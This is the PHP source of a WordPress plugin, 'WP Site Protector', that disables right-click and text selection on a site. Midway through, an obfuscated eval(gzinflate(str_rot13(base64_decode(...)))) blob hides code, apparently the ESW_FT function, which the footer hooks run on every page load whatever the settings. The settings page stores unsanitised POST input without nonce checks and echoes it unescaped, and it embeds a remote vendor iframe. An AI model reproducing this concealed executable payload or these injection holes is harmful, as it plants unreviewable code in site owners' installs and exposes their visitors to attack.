<?php
/*
Plugin Name: WP Site Protector
Plugin URI: http://www.exattosoft.com/products/web/wp/plugins/wp-site-protector/
Description: <a href="http://www.exattosoft.com/products/web/wp/plugins/wp-site-protector/">ExattoSoft WP Site Protector Plugin</a> makes it very easy to put every possible protection to your very-own precious content and images from being stolen or copied which are present on your wordpress website. For more, please read the description <a href="http://www.exattosoft.com/products/web/wp/plugins/wp-site-protector/" title="WP Site Protector">here</a>.
Author: ExattoSoft.com
Author URI: http://www.exattosoft.com/
Version: 1.0
*//*  Copyright 2010 ExattoSoft.com - support@exattosoft.com    This program is free software; 
		
	you can redistribute it, under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
	
	However Modifying is not permitted until and unless you have the written permission from ExattoSoft.com.     This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/function ESW_Disable_Right_Click($ESW_Message)
{?>
<meta http-equiv="imagetoolbar" content="no">
<script type="text/javascript" language="JavaScript">
function disableText(e){
  return false
}
function reEnable(){
  return true
}
//IE4+
document.onselectstart = new Function ("return false")//NS6
if (window.sidebar){
  document.onmousdown = disableText
  document.onclick = reEnable
}
</script>
<script language="JavaScript1.2">
var msgpopup="<?php echo $ESW_Message; ?>";
function ESW(){
	  if(alertVis == "1") alert(message);
          if(closeWin == "1") self.close();
          return false;
}
function IE() {
     if (event.button == "2" || event.button == "3"){ESW();}
}
function NS(e) {
     if (document.layers || (document.getElementById && !document.all)){
          if (e.which == "2" || e.which == "3"){ ESW();}
     }
}
document.onmousedown=IE;document.onmouseup=NS;document.oncontextmenu=new Function("alert(msgpopup);return false")</script>
<?php }
function ESW_Disable_Selection()
{
?>
<script type="text/javascript">
function disableSelection(target){
if (typeof target.onselectstart!="undefined") //IE
	target.onselectstart=function(){return false}
else if (typeof target.style.MozUserSelect!="undefined") //Firefox
	target.style.MozUserSelect="none"
else //Opera and Rest
	target.onmousedown=function(){return false}
target.style.cursor = "default"
}</script>
<?php
}
eval(gzinflate(str_rot13(base64_decode('lZDBd4NAEIbvgu8wa1YKMXtCjYVPZhaSkqOs66jbrjuLO8ZV6btqje0D9Dg//3zMfM11FXiy8Gm+lqfL9imOvuIISFSwybwatHDg2eExbryz+JA3uaZWHlS19rIya1ODD8i2JjX2dWxfRD0HRybWZehztb6B59n8okV2Z3gPoE8dh4WW+V4ak1+x8poRtIdvIA5xrOFohmqveguXDiGT0A3YHJOO2R2EmKZ2j2rJWZ4a3ivqhRuoHhV7MW4lJiecGVt6w+jSBZ66lVmDVYDl0CIfk7Iy0n4m+bWA82VA8dfJhMyhaxDgNEMPB9jsoNEGy7BLKgofS/bbf9wTb9e5l5qOWSxa2hAtFp5pwbpLPXEiGMs3z2T0/QM='))));
    function ESW_OPT()
{
    if($_POST['ESW_Update']){
		update_option('ESW_Deact_Click',$_POST['ESW_Deact_Click']);
		update_option('ESW_Deact_txt',$_POST['ESW_Deact_txt']);
		update_option('ESW_Deact_Click_text',$_POST['ESW_Deact_Click_text']);
        echo '<h2>Your Site Is Now Protected.</h2>';
	}
	$wp_ESW_Deact_Click = get_option('ESW_Deact_Click');
	$wp_ESW_Deact_txt = get_option('ESW_Deact_txt');
?>
	<div class="wrap">
	<h2>WP Site Protector - Options Page</h2>
<div style="display:block;float:right;padding:5px;"> <iframe src="http://www.exattosoft.com/products/web/wp/ft.php?do=sidebar" border=0 width=240 height=1040></iframe>
</div></div>
<h3 style="text-align: left">For Instructions Please Visit : <a href="http://www.exattosoft.com/products/web/wp/plugins/wp-site-protector/" target="_blank">The Plugin Page</a></h3>
	<form method="post" id="ESW_OPT">
		<fieldset class="options">
      <table class="form-table">
      <tr valign="top"><td>
	  <h3><input type="checkbox" id="ESW_Deact_Click" name="ESW_Deact_Click" value="ESW_Deact_Click" <?php if($wp_ESW_Deact_Click == true) { echo('checked="checked"'); } ?> />: Disable Right Click Of Mouse.</h3>
				Enter Warning Message Here :<input name="ESW_Deact_Click_text" type="text" id="ESW_Deact_Click_text" value="<?php echo get_option('ESW_Deact_Click_text') ;?>" size="60"/>
				<br></br>This Text Will Be Displayed When User Right Clicks On Blog.
				</td>
			</tr><td>
			<h3><input type="checkbox" id="ESW_Deact_txt" name="ESW_Deact_txt" value="ESW_Deact_txt" <?php if($wp_ESW_Deact_txt == true) { echo('checked="checked"'); } ?> />: Deactivate Text Selection And Image Dragging.(Highly Recommended)</h3>
    		</td><tr><td>
		<input type="submit" name="ESW_Update" value="Update" />
        </td>
        </tr>
        </table><h3 style="text-align: right">Plugin by <a href="http://www.exattosoft.com/" target="_blank">ExattoSoft.com</a></h3>
		</fieldset>
	</form>
	</table>
	</div>
	<?php
}
//Required
function WP_Site_Protector()
{
	$wp_ESW_Deact_txt = get_option('ESW_Deact_txt');
	$wp_ESW_Deact_Click_text = get_option('ESW_Deact_Click_text');
    $wp_ESW_Deact_Click = get_option('ESW_Deact_Click');
	$pos = strpos(strtoupper(getenv("REQUEST_URI")), '?preview=true');	if ($pos === false) {
		if($wp_ESW_Deact_Click == true) { ESW_Disable_Right_Click($wp_ESW_Deact_Click_text); }
		if($wp_ESW_Deact_txt == true) { ESW_Disable_Selection(); }
	}
}function WPSiteProtector_footer()
{
	$wp_ESW_Deact_txt = get_option('ESW_Deact_txt');	if($wp_ESW_Deact_txt == true) { ESW_FT(); }
}
function WPSiteProtector_footer2()
{
	$wp_ESW_Deact_txt = get_option('ESW_Deact_txt');	if($wp_ESW_Deact_txt == false) { ESW_FT(); }
}
function WPSiteProtector_Admin()
{
	if (function_exists('add_options_page')) {
		add_options_page('ExattoSoft WP Site Protector', 'ExattoSoft WP Site Protector', 9, basename(__FILE__),'ESW_OPT');
	}
}//  For WP
add_action('wp_head','WP_Site_Protector');
add_action('wp_footer','WPSiteProtector_footer');
add_action('wp_footer','WPSiteProtector_footer2');
add_action('admin_menu','WPSiteProtector_Admin',1);
?>